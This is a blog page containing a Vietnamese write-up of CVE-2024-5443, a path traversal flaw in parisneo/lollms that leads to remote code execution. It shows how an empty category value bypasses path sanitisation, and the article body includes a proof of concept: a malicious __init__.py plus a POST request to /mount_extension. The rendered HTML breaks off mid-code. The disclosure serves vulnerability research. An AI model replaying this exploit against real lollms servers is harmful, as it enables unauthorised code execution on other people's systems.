<!DOCTYPE html>
<html lang="en" dir="auto" data-theme="auto">

<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>CVE-2024-5443: Path Traversal Leads to RCE in parisneo/lollms | nhienit</title>
<meta name="keywords" content="research">
<meta name="description" content="CVE-2024-5443 analysis">
<meta name="author" content="nhienit">
<link rel="canonical" href="http://localhost:1313/posts/cve-2024-5443-path-traversal-to-rce/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.343cc480b9ffc8f04ccbe5e968ad674880cab773ec19905e93033065c1e7a804.css" integrity="sha256-NDzEgLn/yPBMy&#43;XpaK1nSIDKt3PsGZBekwMwZcHnqAQ=" rel="preload stylesheet" as="style">
<link rel="icon" href="http://localhost:1313/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/cve-2024-5443-path-traversal-to-rce/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
                color-scheme: dark;
            }

            .list {
                background: var(--theme);
            }

            .toc {
                background: var(--entry);
            }
        }

        @media (prefers-color-scheme: light) {
            .list::-webkit-scrollbar-thumb {
                border-color: var(--code-bg);
            }
        }

    </style>
</noscript>
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.querySelector("html").dataset.theme = 'dark';
    } else if (localStorage.getItem("pref-theme") === "light") {
       document.querySelector("html").dataset.theme = 'light';
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.querySelector("html").dataset.theme = 'dark';
    } else {
        document.querySelector("html").dataset.theme = 'light';
    }

</script><meta property="og:url" content="http://localhost:1313/posts/cve-2024-5443-path-traversal-to-rce/">
  <meta property="og:site_name" content="nhienit">
  <meta property="og:title" content="CVE-2024-5443: Path Traversal Leads to RCE in parisneo/lollms">
  <meta property="og:description" content="CVE-2024-5443 analysis">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-08-08T10:23:44+07:00">
    <meta property="article:modified_time" content="2024-08-08T10:23:44+07:00">
    <meta property="article:tag" content="Research">
      <meta property="og:image" content="http://localhost:1313/images/papermod-cover.png">
      <meta property="og:see_also" content="http://localhost:1313/posts/me_sqli_to_rce/">
      <meta property="og:see_also" content="http://localhost:1313/posts/cve-2022-3133-drawio-xss-to-rce/">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://localhost:1313/images/papermod-cover.png">
<meta name="twitter:title" content="CVE-2024-5443: Path Traversal Leads to RCE in parisneo/lollms">
<meta name="twitter:description" content="CVE-2024-5443 analysis">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "http://localhost:1313/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "CVE-2024-5443: Path Traversal Leads to RCE in parisneo/lollms",
      "item": "http://localhost:1313/posts/cve-2024-5443-path-traversal-to-rce/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "CVE-2024-5443: Path Traversal Leads to RCE in parisneo/lollms",
  "name": "CVE-2024-5443: Path Traversal Leads to RCE in parisneo\/lollms",
  "description": "CVE-2024-5443 analysis",
  "keywords": [
    "research"
  ],
  "articleBody": "Chuyện là dạo gần đây, mình có contribute một bài blog phân tích về một lỗ hổng trên nền tảng huntr, với cộng thêm là gần đây cũng chưa viết bài nào mới nên bài hôm nay mình sẽ viết lại bài phân tích bằng Tiếng Việt để có cái để post (T_T).\n(Bài viết gốc: https://blog.huntr.com/critical-path-traversal-flaw-leads-to-remote-code-execution-in-parisneo/lollms)\n#Product Overview Lord of Large Language Models (LoLLMs) Server là máy chủ tạo văn bản dựa trên các mô hình ngôn ngữ lớn (large language models). Nó cung cấp API dựa trên Flask để tạo văn bản bằng nhiều mô hình ngôn ngữ được đào tạo trước. Máy chủ này được thiết kế để dễ cài đặt và sử dụng, cho phép các nhà phát triển tích hợp các khả năng tạo văn bản mạnh mẽ vào ứng dụng của họ.\n(Bạn có thể tham khảo thêm tại đây: https://github.com/ParisNeo/lollms-webui)\n#Vulnerability Summary Cụ thể là do bản vá bảo mật cho các lỗ hổng trước đó chưa khắc phục triệt để nên cho phép kẻ tấn công có thể dễ dàng bypass bằng ký tự rỗng để khai thác path traversal nhằm thay đổi giá trị của extension_path thành thư mục bất kỳ nằm trong cấu hình lollmsElfServer và thực hiện trigger hàm ExtensionBuilder().build_extension() để load mã độc hại được tải lên bởi attacker.\n#Background Kể từ trước thời điểm khi mình tìm thấy lỗ hổng này, thì có thể thấy rằng có rất nhiều lỗ hổng Path Traversal (bao gồm cả của mình) đã được report rất nhiều (cứ vá rồi lại bypass :3) và được liệt kê trên Hacktivity ở huntr.\nVì thế nên các cơ chế phòng chống cho loại lỗ hổng này cũng ngày một được nâng cao và thường xuyên được update Trong đó, file lollms/security.py sẽ chứa các function để thực hiện kiểm tra và detect những malicous input được nhận vào từ người dùng\n# lollms_core\\lollms\\server\\endpoints\\lollms_personalities_infos.py # ... more code def sanitize_path(path:str, allow_absolute_path:bool=False, error_text=\"Absolute database path detected\", exception_text=\"Detected an attempt of path traversal. Are you kidding me?\"): # Prevent path traversal # ... def sanitize_path_from_endpoint(path: str, error_text=\"A suspected LFI attack detected. The path sent to the server has suspicious elements in it!\", exception_text=\"Invalid path!\"): # Prevent path traversal too # ... def check_access(lollmsElfServer, client_id): # check access # ... def forbid_remote_access(lollmsElfServer, exception_text = \"This functionality is forbidden if the server is exposed\"): # ... và chức năng ngăn chặn này được triển khai ở hầu hết các endpoint nằm bên trong ứng dụng để kiểm soát các input đầu vào\n# lollms_core\\lollms\\server\\endpoints\\lollms_personalities_infos.py # ... more code @router.post(\"/reinstall_personality\") async def reinstall_personality(personality_in: PersonalityIn): check_access(lollmsElfServer, personality_in.client_id) try: sanitize_path(personality_in.name) if not personality_in.name: # ... @router.post(\"/get_personality_config\") def get_personality_config(data:PersonalityDataRequest): print(\"- Recovering personality config\") category = sanitize_path(data.category) name = sanitize_path(data.name) # ... ta thấy rằng tất cả các trick được sử dụng để khai thác từ các bản báo cáo trước đó đều đã được vá, vì thế nên mình quyết định đào sâu vào cơ chế hoạt động này và hy vọng sẽ tìm được cách bypass :\u003c.\n#Analyzing the Vulnerability in Detail #Bypass the filter Trước khi tiếp cận sâu và tìm ra được lỗ hổng được đề cập ở tiêu đề thì mình đã nhìn vào chức năng ở endpoint /get_personality_config này đầu tiên vì nhận thấy được sự bất thường ở cách xử lý của nó\n# lollms_core\\lollms\\server\\endpoints\\lollms_personalities_infos.py # ... more code @router.post(\"/get_personality_config\") def get_personality_config(data:PersonalityDataRequest): print(\"- Recovering personality config\") category = sanitize_path(data.category) # [1] name = sanitize_path(data.name) # [2] package_path = f\"{category}/{name}\" # [3] if category==\"custom_personalities\": # ... else: package_full_path = lollmsElfServer.lollms_paths.personalities_zoo_path/package_path # [4] config_file = package_full_path / \"config.yaml\" if config_file.exists(): with open(config_file,\"r\") as f: config = yaml.safe_load(f) return {\"status\":True, \"config\":config} # ... Tại [1][2], các giá trị data.category và data.name là các giá trị mà người dùng có thể hoàn toàn kiểm soát được, đồng thời các giá trị này nều được đi qua bộ lọc là hàm sanitize_path():\ndef sanitize_path(path:str, allow_absolute_path:bool=False, error_text=\"Absolute database path detected\", exception_text=\"Detected an attempt of path traversal. Are you kidding me?\"): if path is None: return path # Regular expression to detect patterns like \"....\" and multiple forward slashes suspicious_patterns = re.compile(r'(\\.\\.+)|(/+/)') if suspicious_patterns.search(str(path)) or ((not allow_absolute_path) and Path(path).is_absolute()): ASCIIColors.error(error_text) raise HTTPException(status_code=400, detail=exception_text) if not allow_absolute_path: path = path.lstrip('/') return path như ta thấy rõ rằng, bộ lọc kiểm soát khá chặt chẽ để ngăn chặn sử dụng các ký tự đặc biệt để thoát ra khỏi đường dẫn mặc định nên các input bắt đầu bằng các payload như ../, /, \\, … và cũng như các đường dẫn được xem là absolute path đều bị phát hiện.\nTại [3], hai giá trị data.category và data.name được nối với nhau bởi dấu phân cách / và kết quả sẽ được nối vào đường dẫn mặc định mà người dùng chỉ được phép truy cập tại [4].\nTrên python cho phép chúng ta có thể append một Path object với một chuỗi để thực hiện nối các đường dẫn lại với nhau, ví dụ:\n\u003e\u003e\u003e from pathlib import Path \u003e\u003e\u003e a = Path(\"/home/user/public/\") \u003e\u003e\u003e b = \"etc/passwd\" \u003e\u003e\u003e a/b PosixPath('/home/user/public/etc/passwd') nhưng nếu chuỗi được nối tiếp bắt đầu bằng dấu phân cách / (hoặc có dạng absolute path) thì đường dẫn trước đó sẽ bị bỏ qua\n\u003e\u003e\u003e from pathlib import Path \u003e\u003e\u003e a = Path(\"/home/user/public/\") \u003e\u003e\u003e b = \"/etc/passwd\" \u003e\u003e\u003e a/b PosixPath('/etc/passwd') Vì thế lỗ hổng xảy ra ở đây là các giá trị data.category và data.name không check giá trị rỗng dẫn đến kẻ tấn công có thể lạm dụng dấu phân cách giữa hai giá trị này tạo thành đường dẫn tuyệt đối và control được đường dẫn bất kỳ dựa vào giá trị thứ hai\n\u003e\u003e\u003e category = \"\" \u003e\u003e\u003e name = \"tmp/hacked\" \u003e\u003e\u003e package_path = f\"{category}/{name}\" \u003e\u003e\u003e package_path '/tmp/hacked' \u003e\u003e\u003e package_full_path = Path(\"/home/user/public/\")/package_path \u003e\u003e\u003e package_full_path PosixPath('/tmp/hacked') Tuyệt vời, đến đây có thể khẳng định rằng đã có thể bypass được filter, nhưng tại endpoint /get_personality_config này có vẻ việc khai thác path traversal không tạo ra được mức độ nghiêm trọng của vấn đề nên mình phải rà soát thêm các chức năng khác.\n#More impact, more money Sau khi tham khảo lần lượt các lỗ hổng đã được công bố trước đó, thì mình tìm được một lỗ hổng có mã CVE-2024-4320 được mô tả rất chi tiết bởi @retr0reg (Xem chi tiết tại: https://huntr.com/bounties/d6564f04-0f59-4686-beb2-11659342279b).\nLỗ hổng mô tả rằng tại endpoint /install_extension, cho phép kẻ tấn công khai thác lỗ hổng Path Traversal thông qua biến extension_path đến đường dẫn mà kẻ tấn công đã tải mã độc lên và thực thi hàm ExtensionBuilder().build_extension() để thực hiện load malicous code.\nMình đã thực hiện kiểm tra nhanh rằng hiện tại thì lỗ hổng đã được vá ở /install_extension endpoint, nhưng mình phát hiện ra rằng có thể thực thi hàm ExtensionBuilder().build_extension() gián tiếp qua hàm lollmsElfServer.rebuild_extensions() của một endpoint khác là /mount_extension.\n# lollms_core\\lollms\\server\\endpoints\\lollms_extensions_infos.py # ... more code @router.post(\"/mount_extension\") def mount_extension(data:ExtensionMountingInfos): print(\"- Mounting extension\") category = sanitize_path(data.category) name = sanitize_path(data.folder) package_path = f\"{category}/{name}\" package_full_path = lollmsElfServer.lollms_paths.extensions_zoo_path/package_path config_file = package_full_path / \"config.yaml\" # [5] if config_file.exists(): lollmsElfServer.config[\"extensions\"].append(package_path) # [6] lollmsElfServer.mounted_extensions = lollmsElfServer.rebuild_extensions() # [7] Như mô tả bên trên, ta hoàn toàn có thể bypass để điều khiển giá trị package_full_path đến một đường dẫn theo ý của chúng ta. Tại [5], kiểm tra xem file config.yaml có tồn tại trong folder hay không nếu tồn tại thì đường dẫn package_full_path sẽ được thêm vào danh sách các extension được định nghĩa tại lollmsElfServer.config[\"extensions\"] ở [6]. Tại [7], sẽ thực thi hàm lollmsElfServer.rebuild_extensions() như sau:\n# lollms_webui.py # ... more code class LOLLMSWebUI(LOLLMSElfServer): def rebuild_extensions(self, reload_all=False): # ... for i,extension in enumerate(self.config['extensions']): # ... if extension in loaded_names: # ... else: extension_path = self.lollms_paths.extensions_zoo_path/f\"{extension}\" try: extension = ExtensionBuilder().build_extension(extension_path,self.lollms_paths, self) # ... Tại đây, chương trình sẽ thực hiện lặp hết tất cả các đường dẫn extension_path nằm trong config được thêm ở [5], sau đó thực hiện load chúng lên thông qua hàm ExtensionBuilder().build_extension()\n# lollms_core\\lollms\\extension.py # ... more code class ExtensionBuilder: def build_extension( self, extension_path:str, lollms_paths:LollmsPaths, app, installation_option:InstallOption=InstallOption.INSTALL_IF_NECESSARY )-\u003eLOLLMSExtension: extension, script_path = self.getExtension(extension_path, lollms_paths, app) # [8] return extension(app = app, installation_option = installation_option) def getExtension( self, extension_path:str, lollms_paths:LollmsPaths, app )-\u003eLOLLMSExtension: extension_path = lollms_paths.extensions_zoo_path / extension_path # define the full absolute path to the module absolute_path = extension_path.resolve() # infer the module name from the file path module_name = extension_path.stem # use importlib to load the module from the file path loader = importlib.machinery.SourceFileLoader(module_name, str(absolute_path / \"__init__.py\")) # [9] extension_module = loader.load_module() extension:LOLLMSExtension = getattr(extension_module, extension_module.extension_name) return extension, absolute_path Khi hàm ExtensionBuilder().build_extension() thực thi, sẽ tiếp tục gọi hàm ExtensionBuilder().getExtension() tại [8], vì extension_path luôn là giá trị absolute path mà ta truyền vào nên có thể dễ dàng control được giá trị của biến absolute_path theo ý của mình. Đồng thời tại [9], hàm ExtensionBuilder().getExtension() sẽ tìm file __init__.py trong đường dẫn mà kẻ tấn công cung cấp để thực hiện load mã bên trong file này.\n#Exploit Conditions Phải biết discussion_id Phải biết đường dẫn đến folder personal_data #Proof-of-Concept Thực hiện tạo một cuộc hội thoại bất kỳ Tạo 2 file có tên lần lượt là config.yaml và __init__.py như bên dưới\n$ echo \"import os; os.system('calc.exe');\" \u003e __init__.py $ echo \"FOOOO\" \u003e config.yaml Và sau đó upload các file config.yaml and __init__.py vừa tạo thông qua chức năng Send file to AI Send request như bên dưới để trigger RCE\nPOST /mount_extension HTTP/1.1 Host: localhost:1337 Content-Type: application/json Content-Length: 177 { \"category\": \"\", \"folder\": \"/path/to/personal_data/discussion_databases/default//text_data\", \"client_id\": \"jg9yock1FmRZdONsAAAH\", \"language\": \"vi\" } Trong đó, discussion_id ta có thể dễ dàng brute-force bởi vì biến này mang giá trị là một số nguyên dễ đoán #The patch Mình đã nhanh chóng report lỗ hổng này trên huntr và vendor đã nhanh chóng acknowledged lỗ hổng này và bản vá cho lỗ hổng lần này này chỉ đơn giản là xóa các chức năng nguy hiểm này đi #Conclusion Cuối cùng, mình muốn gửi lời cảm ơn đến huntr đã tạo nên một nền tảng hết sức thú vị này, và đồng thời cảm ơn huntr đã chia sẽ và mang bài phân tích này đến với cộng đồng.\n",
  "wordCount" : "1691",
  "inLanguage": "en",
  "image": "http://localhost:1313/images/papermod-cover.png","datePublished": "2024-08-08T10:23:44+07:00",
  "dateModified": "2024-08-08T10:23:44+07:00",
  "author":[{
    "@type": "Person",
    "name": "nhienit"
  }],
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "http://localhost:1313/posts/cve-2024-5443-path-traversal-to-rce/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "nhienit",
    "logo": {
      "@type": "ImageObject",
      "url": "http://localhost:1313/favicon.ico"
    }
  }
}
</script>
</head>
<body id="top">
    <header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="http://localhost:1313/" accesskey="h" title="nhienit (Alt + H)">nhienit</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="http://localhost:1313/archives/" title="Archive">
                    <span>Archive</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/tags/" title="Tags">
                    <span>Tags</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="http://localhost:1313/">Home</a>&nbsp;»&nbsp;<a href="http://localhost:1313/posts/">Posts</a></div>
    <h1 class="post-title entry-hint-parent">
      CVE-2024-5443: Path Traversal Leads to RCE in parisneo/lollms
    </h1>
    <div class="post-description">
      CVE-2024-5443 analysis
    </div>
    <div class="post-meta"><span title='2024-08-08 10:23:44 +0700 +07'>August 8, 2024</span>&nbsp;·&nbsp;<span>8 min</span>&nbsp;·&nbsp;<span>nhienit</span>&nbsp;|&nbsp;<span>
    <a href="https://github.com/adityatelange/hugo-PaperMod/tree/exampleSite/content/posts/cve-2024-5443-path-traversal-to-rce.md" rel="noopener noreferrer edit" target="_blank">Suggest Changes</a>
</span>

</div>
  </header> <div class="toc">
    <details  open>
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#product-overview" aria-label="#Product Overview">#Product Overview</a></li>
                <li>
                    <a href="#vulnerability-summary" aria-label="#Vulnerability Summary">#Vulnerability Summary</a></li>
                <li>
                    <a href="#background" aria-label="#Background">#Background</a></li>
                <li>
                    <a href="#analyzing-the-vulnerability-in-detail" aria-label="#Analyzing the Vulnerability in Detail">#Analyzing the Vulnerability in Detail</a><ul>
                        
                <li>
                    <a href="#bypass-the-filter" aria-label="#Bypass the filter">#Bypass the filter</a></li>
                <li>
                    <a href="#more-impact-more-money" aria-label="#More impact, more money">#More impact, more money</a></li></ul>
                </li>
                <li>
                    <a href="#exploit-conditions" aria-label="#Exploit Conditions">#Exploit Conditions</a></li>
                <li>
                    <a href="#proof-of-concept" aria-label="#Proof-of-Concept">#Proof-of-Concept</a></li>
                <li>
                    <a href="#the-patch" aria-label="#The patch">#The patch</a></li>
                <li>
                    <a href="#conclusion" aria-label="#Conclusion">#Conclusion</a>
                </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><p>Chuyện là dạo gần đây, mình có contribute một bài blog phân tích về một lỗ hổng trên nền tảng <a href="https://huntr.com/">huntr</a>, với cộng thêm là gần đây cũng chưa viết bài nào mới nên bài hôm nay mình sẽ viết lại bài phân tích bằng Tiếng Việt để có cái để post (T_T).</p>
<p>(Bài viết gốc: <a href="https://blog.huntr.com/critical-path-traversal-flaw-leads-to-remote-code-execution-in-parisneo/lollms">https://blog.huntr.com/critical-path-traversal-flaw-leads-to-remote-code-execution-in-parisneo/lollms</a>)</p>
<h3 id="product-overview">#Product Overview<a hidden class="anchor" aria-hidden="true" href="#product-overview">#</a></h3>
<p>Lord of Large Language Models (LoLLMs) Server là máy chủ tạo văn bản dựa trên các mô hình ngôn ngữ lớn (large language models). Nó cung cấp API dựa trên Flask để tạo văn bản bằng nhiều mô hình ngôn ngữ được đào tạo trước. Máy chủ này được thiết kế để dễ cài đặt và sử dụng, cho phép các nhà phát triển tích hợp các khả năng tạo văn bản mạnh mẽ vào ứng dụng của họ.</p>
<p>(Bạn có thể tham khảo thêm tại đây: <a href="https://github.com/ParisNeo/lollms-webui">https://github.com/ParisNeo/lollms-webui</a>)</p>
<h3 id="vulnerability-summary">#Vulnerability Summary<a hidden class="anchor" aria-hidden="true" href="#vulnerability-summary">#</a></h3>
<p>Cụ thể là do bản vá bảo mật cho các lỗ hổng trước đó chưa khắc phục triệt để nên cho phép kẻ tấn công có thể dễ dàng bypass bằng ký tự rỗng để khai thác path traversal nhằm thay đổi giá trị của <code>extension_path</code> thành thư mục bất kỳ nằm trong cấu hình <code>lollmsElfServer</code> và thực hiện trigger hàm <code>ExtensionBuilder().build_extension()</code> để load mã độc hại được tải lên bởi attacker.</p>
<h3 id="background">#Background<a hidden class="anchor" aria-hidden="true" href="#background">#</a></h3>
<p>Kể từ trước thời điểm khi mình tìm thấy lỗ hổng này, thì có thể thấy rằng có rất nhiều lỗ hổng Path Traversal (bao gồm cả của mình) đã được report rất nhiều (cứ vá rồi lại bypass :3) và được liệt kê trên Hacktivity ở huntr.</p>
<p>Vì thế nên các cơ chế phòng chống cho loại lỗ hổng này cũng ngày một được nâng cao và thường xuyên được update
<img loading="lazy" src="/images/cve-2024-5443-path-traversal-to-rce/1.png"></p>
<p>Trong đó, file <code>lollms/security.py</code> sẽ chứa các function để thực hiện kiểm tra và detect những malicous input được nhận vào từ người dùng</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="c1"># lollms_core\lollms\server\endpoints\lollms_personalities_infos.py</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="c1"># ... more code</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">sanitize_path</span><span class="p">(</span><span class="n">path</span><span class="p">:</span><span class="nb">str</span><span class="p">,</span> <span class="n">allow_absolute_path</span><span class="p">:</span><span class="nb">bool</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">error_text</span><span class="o">=</span><span class="s2">&#34;Absolute database path detected&#34;</span><span class="p">,</span> <span class="n">exception_text</span><span class="o">=</span><span class="s2">&#34;Detected an attempt of path traversal. Are you kidding me?&#34;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># Prevent path traversal</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># ...</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">sanitize_path_from_endpoint</span><span class="p">(</span><span class="n">path</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">error_text</span><span class="o">=</span><span class="s2">&#34;A suspected LFI attack detected. The path sent to the server has suspicious elements in it!&#34;</span><span class="p">,</span> <span class="n">exception_text</span><span class="o">=</span><span class="s2">&#34;Invalid path!&#34;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># Prevent path traversal too</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># ...</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">check_access</span><span class="p">(</span><span class="n">lollmsElfServer</span><span class="p">,</span> <span class="n">client_id</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># check access</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># ...</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">forbid_remote_access</span><span class="p">(</span><span class="n">lollmsElfServer</span><span class="p">,</span> <span class="n">exception_text</span> <span class="o">=</span> <span class="s2">&#34;This functionality is forbidden if the server is exposed&#34;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># ...</span>
</span></span></code></pre></div><p>và chức năng ngăn chặn này được triển khai ở hầu hết các endpoint nằm bên trong ứng dụng để kiểm soát các input đầu vào</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="c1"># lollms_core\lollms\server\endpoints\lollms_personalities_infos.py</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="c1"># ... more code</span>
</span></span><span class="line"><span class="cl"><span class="nd">@router.post</span><span class="p">(</span><span class="s2">&#34;/reinstall_personality&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">async</span> <span class="k">def</span> <span class="nf">reinstall_personality</span><span class="p">(</span><span class="n">personality_in</span><span class="p">:</span> <span class="n">PersonalityIn</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">check_access</span><span class="p">(</span><span class="n">lollmsElfServer</span><span class="p">,</span> <span class="n">personality_in</span><span class="o">.</span><span class="n">client_id</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">sanitize_path</span><span class="p">(</span><span class="n">personality_in</span><span class="o">.</span><span class="n">name</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">personality_in</span><span class="o">.</span><span class="n">name</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">   <span class="c1"># ... </span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="nd">@router.post</span><span class="p">(</span><span class="s2">&#34;/get_personality_config&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_personality_config</span><span class="p">(</span><span class="n">data</span><span class="p">:</span><span class="n">PersonalityDataRequest</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;- Recovering personality config&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">category</span> <span class="o">=</span> <span class="n">sanitize_path</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">category</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">name</span> <span class="o">=</span> <span class="n">sanitize_path</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">name</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">   <span class="c1"># ...</span>
</span></span></code></pre></div><p>ta thấy rằng tất cả các trick được sử dụng để khai thác từ các bản báo cáo trước đó đều đã được vá, vì thế nên mình quyết định đào sâu vào cơ chế hoạt động này và hy vọng sẽ tìm được cách bypass :&lt;.</p>
<h3 id="analyzing-the-vulnerability-in-detail">#Analyzing the Vulnerability in Detail<a hidden class="anchor" aria-hidden="true" href="#analyzing-the-vulnerability-in-detail">#</a></h3>
<h4 id="bypass-the-filter">#Bypass the filter<a hidden class="anchor" aria-hidden="true" href="#bypass-the-filter">#</a></h4>
<p>Trước khi tiếp cận sâu và tìm ra được lỗ hổng được đề cập ở tiêu đề thì mình đã nhìn vào chức năng ở endpoint <code>/get_personality_config</code> này đầu tiên vì nhận thấy được sự bất thường ở cách xử lý của nó</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="c1"># lollms_core\lollms\server\endpoints\lollms_personalities_infos.py</span>
</span></span><span class="line"><span class="cl"><span class="c1"># ... more code</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="nd">@router.post</span><span class="p">(</span><span class="s2">&#34;/get_personality_config&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_personality_config</span><span class="p">(</span><span class="n">data</span><span class="p">:</span><span class="n">PersonalityDataRequest</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;- Recovering personality config&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">category</span> <span class="o">=</span> <span class="n">sanitize_path</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">category</span><span class="p">)</span> <span class="c1"># [1]</span>
</span></span><span class="line"><span class="cl">    <span class="n">name</span> <span class="o">=</span> <span class="n">sanitize_path</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">name</span><span class="p">)</span> <span class="c1"># [2]</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">    <span class="n">package_path</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">category</span><span class="si">}</span><span class="s2">/</span><span class="si">{</span><span class="n">name</span><span class="si">}</span><span class="s2">&#34;</span> <span class="c1"># [3]</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">category</span><span class="o">==</span><span class="s2">&#34;custom_personalities&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># ...</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>            
